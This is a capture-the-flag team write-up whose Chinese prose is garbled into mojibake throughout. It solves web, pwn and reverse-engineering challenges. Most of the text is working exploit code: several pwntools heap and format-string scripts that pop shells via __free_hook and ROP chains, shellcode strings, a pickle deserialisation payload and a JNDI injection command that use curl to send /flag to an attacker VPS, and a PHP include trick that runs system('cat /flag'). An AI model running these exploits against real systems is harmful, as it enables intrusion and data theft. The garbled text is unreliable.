¡éªŒå‡ºé”™ï¼Œä¿®ä¸€ä¸‹ä¸¤å¼ å›¾çš„crcè·‘ç›²æ°´å° å€’ç½®ä¸€ä¸‹ï¼Œä¿®ä¸€ä¿®å›¾çœ‹èµ·æ¥æ›´æ¸…æ™° ç„¶åæ ¹æ®hintæ›¿æ¢å…¶ä¸­æŸäº›å­—ç¬¦å³å¯ flag{356ffd89983749059ab1e3e968a01d90} webzerocalcè®¿é—®é¢˜ç›® readFile('./src/index.js') è¯´flagåœ¨rootç›®å½•ï¼Œä½†æ˜¯åå­—æ˜¯éšæœºçš„ï¼Œä½†æ˜¯å…¶å®å¹¶æ²¡æœ‰éšæœºï¼ŒreadFile('/flag') flag{Hf4ulmUeLzShDRRfHdS4E8UhrlYbyMM6} new_hospitaléšä¾¿ç‚¹ç‚¹èƒ½å¤Ÿæ‰¾åˆ°feature.php?id=2ï¼Œå‘ç°æ–‡ä»¶åŒ…å« é™¤æ­¤ä¹‹å¤–è¿˜å‘ç°ä¼šç»™cookieèµ‹å€¼(url+base64è§£ç ä¹‹åå°±æ˜¯è¯»å–çš„æ–‡ä»¶äº†)ï¼š ä½†æ˜¯ä¸ç®¡äº›ä»€ä¹ˆéƒ½ä¼šè¢«å¼ºåˆ¶åŠ ä¸Šåç¼€jsï¼Œæ‰€ä»¥å°±æ²¡æœ‰å¤ªå¤§æ„ä¹‰ï¼Œäºæ˜¯å°±æ‰«ç›®å½•ï¼Œæ‰«å‡ºæœ‰oldç›®å½•å’Œflag.php oldç›®å½•å‘ç°ä¾ç„¶æ˜¯è¿™ä¸ªç«™(çŒœæµ‹æ˜¯è¯¥é¢˜ç›®è€ƒç‚¹å°±æ˜¯è€ç«™è¿ç§»æœªåŠæ—¶åˆ é™¤æ—§æ–‡ä»¶å¸¦æ¥çš„é—®é¢˜)ï¼Œä½†æ˜¯å‘ç°idæ²¡åŠæ³•ä¿®æ”¹è¯»å–çš„æ–‡ä»¶ï¼Œæ˜¯æ ¹æ®cookieæ¥è·å–è¯»å–çš„æ–‡ä»¶çš„ï¼Œå¹¶ä¸”ä¸ä¼šå¢åŠ åç¼€ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä¿®cookieè¯»å–/var/www/html/flag.phpå³å¯ ezpickleç®€å•çš„pickleååºåˆ—åŒ–ï¼Œç»™äº†ä¸ªè¿‡æ»¤æ˜¯å¿…é¡»configæ¨¡å—ä¸‹çš„å±æ€§ä¸”ä¸èƒ½æœ‰åŒä¸‹åˆ’çº¿ï¼Œconfigæœ‰ä¸ªåé—¨ï¼š notadmin={\"admin\":\"no\"} def backdoor(cmd): if notadmin[\"admin\"]==\"yes\": s=''.join(cmd) eval(s) åˆ†åˆ«è·å–backdoorå’Œnotadminï¼Œç»™notadminçš„adminèµ‹å€¼ä¸ºyesï¼Œpkerç›´æ¥æ„é€ å°±è¡Œäº†ï¼Œcurlå¤–å¸¦ä¸€ä¸‹ï¼šåˆ©ç”¨pkerç¼–å†™exp backdoor = GLOBAL(\"config\",\"backdoor\") notadmin = GLOBAL(\"config\",\"notadmin\") notadmin[\"admin\"] = \"yes\" backdoor(\"__import__('os').system('curl -F file=@/flag http://vps:port')\") easy-filter&lt;?php ini_set(\"open_basedir\",\"./\"); if(!isset($_GET['action'])){ highlight_file(__FILE__); die(); } if($_GET['action'] == 'w'){ @mkdir(\"./files/\"); $content = $_GET['c']; $file = bin2hex(random_bytes(5)); file_put_contents(\"./files/\".$file,base64_encode($content)); echo \"./files/\".$file; }elseif($_GET['action'] == 'r'){ $r = $_GET['r']; $file = \"./files/\".$r; include(\"php://filter/resource=$file\"); } æœ‰includeï¼Œæ‰€ä»¥æƒ³åˆ°çš„æ˜¯æ‰§è¡Œä»£ç ç”¨systemæ¥ç»•basedirè¯»flagã€‚ å‰é¢file_put_contentsä¼šå†™å…¥base64ï¼Œåé¢çš„filterç”¨base64ï¼Œå› ä¸ºä¼šæ‹¼æ¥ä¸Šfiles: php://filter/resource=./files/file_name ä½†å¸¸è§çš„ä¸€ä¸ªfilteræ ¼å¼å¦‚ä¸‹ï¼š php://filter/read=string.toupper/resource é‚æƒ³åˆ°å°†resource=./files/file_nameè¿™ä¸€æ®µå½“åšfilterå‚æ•°çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤æœ‰ï¼š read=convert.base64-encode/resource= æ‹¼æ¥ä¸º php://filter/resource=./files/read=convert.base64-encode/resource= å…ˆå†™ c=&lt;?php echo system('cat /flag');?&gt; å†åŒ…å«å³å¯ï¼š read=convert.base64-decode/resource=/../../xxxxxx jack-shiroçº¢æ˜è°·æ¯åŸé¢˜: https://www.zhaoj.in/read-6859.html ï¼Œå‚è€ƒå…¶æ“ä½œåœ¨VPSä¸Šæ­å»ºå·¥å…·å³å¯ï¼š è¿è¡Œï¼š java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://vps:1234 -F file=@/flag' å¾—åˆ°flag give-me-your-0dayè¿™é¢˜æ¯”èµ›çš„æ—¶å€™å¡äº†å¾ˆä¹…ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯è¿™é‡Œæ²¡åŠæ³•ç»•è¿‡ï¼š å› ä¸ºé¢˜ç›®æ˜¯å…±äº«ç¯å¢ƒï¼Œæ‰€ä»¥å®‰è£…è‚¯å®šæ˜¯æ²¡åŠæ³•å®‰è£…çš„ï¼Œäºæ˜¯å¦å¯»æ€è·¯ï¼Œæƒ³åˆ°æ¶æ„mysqlæ„é€ ä»»æ„æ–‡ä»¶è¯»å–ã€‚åˆ©ç”¨å·¥å…·ï¼šhttps://github.com/Al1ex/Rogue-MySql-Server/blob/master/rogue_mysql_server.py åœ¨vpsä¸Šæ­å»ºï¼Œä½†æ˜¯ç›´æ¥è¿æ¥çš„æ—¶å€™å‘ç°PDOçš„LOCAL DATAæ— æ³•ä½¿ç”¨ï¼š ç¿»çœ‹æºç å‘ç°å¯ä»¥ä½¿ç”¨mysqliè¿›è¡Œè¿æ¥ï¼š æ‰€ä»¥æŠ“åŒ…æ›´æ¢ä¸€ä¸‹å³å¯ dbAdapter=Mysqli&amp;dbHost=vps&amp;dbPort=port&amp;dbUser=root&amp;dbPassword=rooot&amp;dbDatabase=typecho&amp;dbCharset=utf8&amp;dbPrefix=typecho_&amp;userUrl=http%3A%2F%2F121.36.229.59%3A32768&amp;userName=admin&amp;userPassword=&amp;userMail=webmaster%40yourdomain.com&amp;action=config å¾—åˆ°flagï¼š pwnbornote2.31 offbynull #encoding:utf-8 from pwn import * context.terminal = ['tmux','sp','-h'] context.log_level = 'DEBUG' # sh = process('./bornote') sh = remote('121.36.250.162',49154) # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('./libc-2.31.so') def menu(choice): sh.recvuntil(\"cmd: \") sh.sendline(str(choice)) def add(size): menu(1) sh.recvuntil(\"Size: \") sh.sendline(str(size)) def edit(idx, content): menu(3) sh.recvuntil(\"Index: \") sh.sendline(str(idx)) sh.recvuntil(\"Note: \") sh.sendline(content) def delete(idx): menu(2) sh.recvuntil(\"Index: \") sh.sendline(str(idx)) def show(idx): menu(4) sh.recvuntil(\"Index: \") sh.sendline(str(idx)) sh.recvuntil(\"Note: \") data = sh.recv(6) return data sh.recvuntil(\"name:\") sh.sendline('aaa') add(0x418) #0 fake-&gt;fd b390 add(0x128) #1 add(0x418) #2 add(0x438) #3 target bd00 add(0x148) #4 add(0x428) # 5 fake-&gt;bk c290 add(0x138) # 6 delete(0) delete(3) delete(5) # delete(2) #2 &amp; 3 unlink add(0x438) # 0 set size edit(0,b'a' * 0x418 + p64(0xb01)[:7]) add(0x418) # 2 c20 add(0x428) # 3 bk 190 add(0x418) # 5 fd 290 delete(5) delete(2) add(0x418) # 2 partial overwrite bk -&gt; 9c00 edit(2,b'\\x01' * 8) add(0x418) # 5 c20 delete(5) delete(3) add(0x5f8) # 3 chunk into largebin add(0x428) # 5 partial overwrite fd edit(5,b'') add(0x418) # 7 c20 ## è§¦å‘offbynull å‘å‰åˆå¹¶ # gdb.attach(sh,'b * $rebase(0x1781)') add(0x108) #8 gap edit(8,p64(0) + p64(0x111)) edit(6, b'\\x01' * 0x138) #offbynull edit(6, b'\\x01' * 0x130 + p64(0xb00)) #prev_size delete(3) ## edit(1,'/bin/sh\\x00') add(0x10) #3 # show(7) libc_base = u64(show(7).ljust(8,b'\\x00')) - 0x1EBBE0 log.success(\"libc_base = \" + hex(libc_base)) fake_fast = 0x1EBB3D + libc_base # gdb.attach(sh,'b * $rebase(0x1E16)') add(0x128) #9 delete(1) delete(9) edit(7,p64(libc_base + libc.symbols[\"__free_hook\"])) add(0x128) add(0x128) #9 edit(0,'/bin/sh\\x00') edit(9,p64(libc_base + libc.symbols[\"system\"])) sh.sendline('2') sh.sendline('0') sh.interactive() pwnpwnæ ¼å¼åŒ–å­—ç¬¦ä¸² æ ˆæº¢å‡º # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.arch = 'amd64' context.terminal=['/usr/bin/tmux', 'splitw', '-h'] prog = './pwnpwn' s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) #p = process(prog)#env={\"LD_PRELOAD\":\"./libc.so.6\"}) libc = ELF(\"./libc-2.23.so\") p = remote(\"124.71.156.217\",49153) def dbg(): gdb.attach(p) def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) sl('1') ru('0x') data = int(r(12),16) print hex(data) exe = data - 0x9b9 sl('2') ru(\"hello\\n\") #debug([0xa07]) sl('%3$p+%27$p') addr=int(ru(\"+\",drop=True),16)-(0x7f3c9335d360-0x7f3c93266000) canary=int(ru(\"\\n\",drop=True),16) print hex(addr) print hex(canary) #-------------------------- libc = ELF(\"./libc-2.23.so\") pop_rdi=0x21112+addr sh=libc.search(\"/bin/sh\").next()+addr sys=addr+libc.sym['system'] pay='a'*0x68+p64(canary)+'attack\\x00\\x00'+p64(pop_rdi)+p64(sh)+p64(sys) sl(pay) # dbg() it() bitflipoff-by-one # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.terminal=['tmux', 'splitw', '-h'] prog = './bitflip' #elf = ELF(prog)#nc 121.36.194.21 49155 #p = process(prog)#,env={\"LD_PRELOAD\":\"./libc-2.27.so\"}) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\") p = remote(\"124.71.130.185\", 49155)#nc 124.71.130.185 49155 def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) def dbg(): gdb.attach(p) #----------------------------------------------------------------------------------------- s = lambda data :p.send(str(data)) #in case that data is an int sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) def dbgc(addr): gdb.attach(p,\"b*\" + hex(addr) +\"\\n c\") def lg(s,addr): print('\\033[1;31;40m%20s--&gt;0x%x\\033[0m'%(s,addr)) sh_x86_18=\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x86_20=\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x64_21=\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\" def choice(idx): sla(\"Your choice: \",str(idx)) def add(idx,sz): choice(1) sla(\"Index: \",idx) sla(\"Size: \",sz) # sa(\"content?\",cno) def delete(idx): choice(4) sla(\"Index: \",idx) def show(idx): choice(3) sla(\"Index: \",idx) def edit(idx,con): choice(2) sla(\"Index: \",idx) # sla(\"size?\",sz) sa(\"Content: \",con) def exp(): #debug([0x7B9]) add(0,0x48) add(1,0x20) add(2,0x30) add(3,0x30) edit(0,0x48*'a'+p8(0x51)) delete(1) delete(3) delete(2) add(1,0x48) edit(1,0x30*'a'+'\\n') show(1) ru('a'*0x30) data = uu64(r(6)) heap = data - 0x555711a7c30a + 0x555711a7c000 lg('heap',heap) #----------------------------------- edit(1,'b'*0x20+p64(0)+p64(0x41)+p64(data+22)+'\\n') add(4,0x28) add(5,0x40) add(6,0x50) for i in range(13): add(i+7,0x50) add(31,0x28) add(30,0x20) add(29,0x30) add(28,0x30) add(27,0x30) delete(29) delete(28) delete(27) edit(6,p64(0)+p64(0x551-0x80)+'\\n') edit(31,0x28*'c'+p8(0x61)) delete(30) add(30,0x50) edit(30,0x28*'d'+p64(0x41)+p64(heap+0x3f0)+'\\n') add(27,0x30) add(28,0x30) delete(28) edit(6,0xf*'x'+'\\n') show(6) ru('x\\n') data = uu64(r(6)) addr = data - 0x7ff81693aca0 + 0x7ff81654f000 lg('addr',addr) sys = addr + libc.sym['system'] fh = addr + libc.sym['__free_hook'] edit(6,p64(0)+p64(0x4d1)+p64(data)*2+p64(fh)+'\\n') #----------------------------------------- add(21,0x10) delete(7) add(22,0x40) edit(22,'x'*0x20+p64(0)+p64(0x61)+p64(fh)+'\\n') add(23,0x50) add(24,0x50) edit(24,p64(sys)+'\\n') edit(0,'/bin/sh\\x00\\n') delete(0) # dbg() it() if __name__ == '__main__': exp() oldschooloff-by-one # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.terminal=['tmux', 'splitw', '-h'] prog = './old_school' #elf = ELF(prog)#nc 121.36.194.21 49155 #p = process(prog)#,env={\"LD_PRELOAD\":\"./libc-2.27.so\"}) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\") p = remote(\"121.36.194.21\", 49155)#nc 123.60.63.90 6888 def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) def dbg(): gdb.attach(p) #----------------------------------------------------------------------------------------- s = lambda data :p.send(str(data)) #in case that data is an int sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) def dbgc(addr): gdb.attach(p,\"b*\" + hex(addr) +\"\\n c\") def lg(s,addr): print('\\033[1;31;40m%20s--&gt;0x%x\\033[0m'%(s,addr)) sh_x86_18=\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x86_20=\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x64_21=\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\" #https://www.exploit-db.com/shellcodes #----------------------------------------------------------------------------------------- def choice(idx): sla(\"Your choice: \",str(idx)) def add(idx,sz): choice(1) sla(\"Index: \",idx) sla(\"Size: \",sz) # sa(\"content?\",cno) def delete(idx): choice(4) sla(\"Index: \",idx) def show(idx): choice(3) sla(\"Index: \",idx) def edit(idx,con): choice(2) sla(\"Index: \",idx) # sla(\"size?\",sz) sa(\"Content: \",con) def exp(): #debug([0x7B9]) add(0,0x38) add(1,0x10) add(2,0x80) add(3,0x80) add(4,0x28) add(5,0x20) add(6,0x50) # add() for i in range(7): add(i+10,0x80) for i in range(7): delete(i+10) # delete(0) pay = 'a'*0x38 + p8(0x81) edit(0,pay) delete(1) add(1,0x70) delete(2) edit(1,0x20*'b'+'\\n') show(1) ru('b'*0x20) data = uu64(r(6)) lg('data',data) addr = data - 0x00007ff4965d5c0a + 0x7ff4961ea000 lg('addr',addr) sys = addr + libc.sym['system'] fh = addr + libc.sym['__free_hook'] #edit(1,0x10*'d'+p64(0)+p64(0x91)+p64(data)*2+'\\n') #----------------------------------------------------- edit(4,0x28*'c'+p8(0x71)) delete(5) delete(6) add(5,0x60) edit(5,0x20*'x'+p64(0)+p64(0x61)+p64(fh)+'\\n') add(6,0x50) add(0x1f,0x50) edit(6,'/bin/sh\\x00'+'\\n') edit(0x1f,p64(sys)+'\\n') delete(6) # dbg() it() if __name__ == '__main__': exp() old-school-revenge2.27 off by null from pwn import* r=remote(\"123.60.63.39\",49155) #r=process('./main') context.log_level='debug' libc=ELF('./libc-2.27.so') def new(idx,size): r.recvuntil(\": \") r.sendline(\"1\") r.recvuntil(\": \") r.sendline(str(idx)) r.recvuntil(\": \") r.sendline(str(size)) def edit(idx,content): r.recvuntil(\": \") r.sendline(\"2\") r.recvuntil(\": \") r.sendline(str(idx)) r.recvuntil(\": \") r.send(content) def show(idx): r.recvuntil(\": \") r.sendline(\"3\") r.recvuntil(\": \") r.sendline(str(idx)) def delete(idx): r.recvuntil(\": \") r.sendline(\"4\") r.recvuntil(\": \") r.sendline(str(idx)) for i in range(11): new(i,0xB8) for i in range(4,11): delete(i) delete(0) delete(1) delete(2) for i in range(4,11): new(i,0xB8) new(0,0xB8) edit(0,'\\x00'*0xb8) new(1,0xB8) new(2,0x38) for i in range(4,11): delete(i) delete(1) delete(3) for i in range(4,11): new(i,0xB8) new(1,0xB8) show(2) libc_base=u64(r.recvuntil('\\x7f')[-6:]+p16(0))-libc.sym['__malloc_hook']-0x70 success(\"libc_base: \"+hex(libc_base)) new(12,0x38) delete(2) edit(12,p64(libc_base+libc.sym['__free_hook'])+'\\n') new(2,0x38) new(13,0x38) edit(13,p64(libc_base+libc.sym['system'])+'\\n') edit(0,'/bin/sh\\x00\\n') delete(0) #gdb.attach(r) r.interactive() random-heapUaf from pwn import* r=remote(\"124.71.140.198\",49155) #r=process('./main') context.log_level='debug' libc=ELF('./libc-2.27.so') def new(idx,size): r.recvuntil(': ') r.sendline(\"1\") r.recvuntil(': ') r.sendline(str(idx)) r.recvuntil(': ') r.sendline(str(size)) def edit(idx,content): r.recvuntil(': ') r.sendline(\"2\") r.recvuntil(': ') r.sendline(str(idx)) r.recvuntil(': ') r.send(content) def show(idx): r.recvuntil(': ') r.sendline(\"3\") r.recvuntil(': ') r.sendline(str(idx)) def delete(idx): r.recvuntil(': ') r.sendline(\"4\") r.recvuntil(': ') r.sendline(str(idx)) new(0,0x100) new(1,0x18) delete(0) edit(0,p64(0)*2) delete(0) edit(0,'a'*0x8) show(0) heap=u64(r.recvline()[:-1][-6:]+p16(0))-0x10 success(\"heap: \"+hex(heap)) for i in range(6): edit(0,p64(0)*2) delete(0) #new(2,0x100) r.recvuntil(': ') r.sendline(\"0\"*0x500) show(0) libc_base=u64(r.recvuntil('\\x7f')[-6:]+p16(0))-libc.sym['__malloc_hook']-0x70 libc_base=libc_base//0x1000*0x1000 success(\"libc_base: \"+hex(libc_base)) delete(1) edit(1,p64(libc_base+libc.sym[\"__free_hook\"])) for i in range(0x20): new(2,0x18) edit(2,p64(libc_base+libc.sym['system'])) new(3,0x18) edit(3,'/bin/sh\\x00') #gdb.attach(r) delete(3) r.interactive() oldechoæ ¼å¼åŒ–å­—ç¬¦ä¸²æ”¹stdoutçš„filenoä¸º2å°±å¯ä»¥æ­£å¸¸è¾“å‡º from pwn import* r=remote(\"123.60.32.152\",49154) #r=process('./main') context.log_level='debug' libc=ELF(\"./libc-2.23.so\") r.recvuntil(\"Gift: \") stack=int(r.recvline(),16) success(\"stack: \"+hex(stack)) r.recvline() r.sendline(\"%\"+str(stack%0x100-0x20)+\"c%6$hhn\") r.sendline(\"%\"+str(0xA90)+\"c%10$hn\") stack=stack-0x110 success(\"stack: \"+hex(stack)) r.sendline(\"%\"+str((stack+0xa0)%0x100)+\"c%14$hhn\") r.sendline(\"%\"+str(0x90)+\"c%40$hhn\") r.sendline(\"%\"+str(0x2)+\"c%29$hhn\") r.recv(2) r.sendline(\"%13$p;%9$p;\") libc_base=int(r.recvuntil(';',drop=True),16)-libc.sym[\"__libc_start_main\"]-240 pie=int(r.recvuntil(';',drop=True),16) pop_rax=libc_base+0x3a738 pop_rdi=libc_base+0x21112 pop_rsi=libc_base+0x202f8 pop_rdx=libc_base+0x1b92 syscall=libc_base+0xbc3f5 payload='' payload+=p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(pie+0xb0+0x20)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall) payload+=p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc_base+libc.sym['environ'])+p64(pop_rdx)+p64(0x30)+p64(syscall) payload+=p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(2)+p64(syscall) payload+='flag' r.sendline(\"%\"+str((stack-0x8)%0x100)+\"c%6$hhn\") r.recv() r.sendline(\"%\"+str(0xedd)+\"c%10$hn\") r.recv() r.sendline(\"%\"+str((stack-0x10)%0x100)+\"c%6$hhn\") r.recv() #gdb.attach(r,'b printf') r.sendline((\"%\"+str(0x3f)+\"c%10$hhn\").ljust(0x18,'\\x00')+payload) r.interactive() sonicæº¢å‡º # _*_ coding:utf-8 _*_ from pwn import * context.log_level = 'debug' context.terminal=['tmux', 'splitw', '-h'] prog = './sonic' #elf = ELF(prog) #p = process(prog)#,env={\"LD_PRELOAD\":\"./libc-2.27.so\"}) #libc = ELF(\"/usr/lib/x86_64-linux-gnu/libc-2.31.so\") p = remote(\"123.60.63.90\", 6889)#nc 123.60.63.90 6888 def debug(addr,PIE=True): debug_str = \"\" if PIE: text_base = int(os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[1], 16) for i in addr: debug_str+='b *{}\\n'.format(hex(text_base+i)) gdb.attach(p,debug_str) else: for i in addr: debug_str+='b *{}\\n'.format(hex(i)) gdb.attach(p,debug_str) def dbg(): gdb.attach(p) #----------------------------------------------------------------------------------------- s = lambda data :p.send(str(data)) #in case that data is an int sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) it = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) bp = lambda bkp :pdbg.bp(bkp) li = lambda str1,data1 :log.success(str1+'========&gt;'+hex(data1)) def dbgc(addr): gdb.attach(p,\"b*\" + hex(addr) +\"\\n c\") def lg(s,addr): print('\\033[1;31;40m%20s--&gt;0x%x\\033[0m'%(s,addr)) sh_x86_18=\"\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x86_20=\"\\x31\\xc9\\x6a\\x0b\\x58\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\" sh_x64_21=\"\\xf7\\xe6\\x50\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48\\x89\\xe7\\xb0\\x3b\\x0f\\x05\" def exp(): #debug([0x7B9]) ru(\"ss=0x\") data = int(r(12),16) lg('data',data) pop_rdi = data - 0x7CF + 0x00000000000008c3 pop_rsi = data - 0x7cf + 0x00000000000008c1 execve = data - 0x7cf + 0x610 arg = data - 0x7cf + 0x201040 pay = '/bin/sh\\x00'*5 + p64(pop_rdi) + p64(arg) + p64(pop_rsi)+p64(0)*2+ p64(execve) sl(pay) it() if __name__ == '__main__': exp() revmarmgicarmv7 32é€†å‘000103E8ä¸»è¦é€»è¾‘ï¼Œæ¥å—çš„å­—ç¬¦ä¸²ä¸ºhexçš„å½¢å¼ï¼ˆä¾‹å¦‚420aâ€¦ï¼‰ç–‘ä¼¼ä¸ºè™šæ‹Ÿæœºé¢˜ï¼Ÿ å°†è¯»å…¥çš„å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—ï¼Œç„¶ååœ¨è¿™äº›switché‡Œé¢ä½¿ç”¨å¯¹åº”çš„å‡½æ•°ï¼Œæ¯ä¸ªå‡½æ•°åšçš„äº‹æƒ…æœ¬è´¨ä¸ºå„ä¸ªæ•°ç»„çš„è½®è½¬å­˜å‚¨ï¼ˆä¾‹å¦‚ç¬¬ä¸€ä¸ªå‡½æ•°ä¼šå¤„ç†è¿›è¡Œa[0],b[0],c[0],d[0] -&gt; b[0],c[0],d[0],a[0]ï¼Œç„¶åæ•°ç»„è‡ªå¢3ï¼Œå†æ¬¡äº¤æ¢ï¼‰æ€»å…±æœ‰6ä¸ªæ•°ç»„ï¼Œæ¯ä¸ªæ•°ç»„æœ‰9ä¸ªæ•°å­—æœ¬è´¨é­”æ–¹é¢˜ï¼Œå¯ä»¥çœ‹è¿™ä¸ªåœ°æ–¹ ä¾‹å¦‚0x10çš„æ“ä½œå®é™…ä¸Šç›¸å½“äºé­”æ–¹è¿™ä¸ªæ“ä½œ é¢˜ç›®æœ€ç»ˆcheckçš„æ—¶å€™ï¼Œåˆ†æˆäº†ä¸¤éƒ¨æ£€æŸ¥é¢æ˜¯å¦ä¸ºå¯¹åº”çš„é¢ å¤§çº¦ç›¸å½“äºè®¡ç®—è¿™ä¸¤ä¸ªå€¼ï¼ˆå¦‚å›¾ï¼‰ 0 2 4 6 8 ä¸ºæ–œå¯¹è§’ï¼ˆè“è‰²ï¼‰1 3 4 5 7 ä¸ºåå­—è¾¹ï¼ˆé»„è‰²ï¼‰4è¢«ç”¨äº†ä¸¤æ¬¡ï¼ˆç»¿è‰²)ç”¨æ­¤ç®—æ³•ç¡®å®šå”¯ä¸€çš„é¢ã€‚æ ¹æ®ä¸Šé¢çš„å¼å­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥ä»¥ä¸‹æ¡ä»¶ å½“å‰æœ‰6ä¸ªæ•°ç»„ï¼ˆ54ä¸ªæ•°å­—ï¼‰ï¼Œåˆ†åˆ«è±¡å¾ç€ä¸€ä¸ªé¢ æ¯æ¬¡è¾“å…¥çš„åå…­è¿›åˆ¶æ˜¯ä¸€ä¸ªè½¬åŠ¨æ“ä½œ ç”±äºæ­¤æ—¶åˆ†åˆ«è®¡ç®—åå­—è¾¹å’Œæ–œå¯¹è§’ï¼Œäºæ˜¯æ­¤æ—¶å¯ä»¥é€€åŒ–æˆä¸€ä¸ªç»„åˆé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯ ä»54ä¸ªæ•°å­—ä¸­å–å‡º5ä¸ªï¼Œè®©å…¶ç­”æ¡ˆç­‰äºå¯¹åº”å€¼ï¼Œäºæ˜¯å¯ä»¥å†™å‡ºçˆ†ç ´ä»£ç ï¼Œå¾—åˆ°æ¯ä¸ªé¢çš„æœ€ç»ˆçŠ¶æ€ã€‚ ä¹‹ååœ¨è§£é¢˜è¿‡ç¨‹ä¸­å‘ç°ï¼Œæœ€åçš„checké€»è¾‘ä¼¼ä¹å¯¼è‡´æ•´ä¸ªé¢˜ç›®ä¸éœ€è¦ã€çœŸæ­£æ±‚å‡ºè½¬åŠ¨æ€è·¯ã€‘ï¼š æœ€åä¼šå°†æœ€ç»ˆé­”æ–¹çš„é¢å’Œä¸€ä¸ªæŒ‡å®šçš„å¦ä¸€ä¸ªç±»ä¼¼é­”æ–¹çš„æ•°ç»„è¿›è¡Œç›¸ä¹˜ç›¸åŠ ï¼Œæœ€ç»ˆä¼šå¾—åˆ°ç›®æ ‡å­—ç¬¦ä¸²ã€‚è™½ç„¶ä¸Šä¸€æ­¥æˆ‘ä»¬ã€åªèƒ½æ±‚å‡ºæ¯ä¸ªé¢æ‰€éœ€çš„æ•°å­—ï¼Œä½†æ˜¯æ— 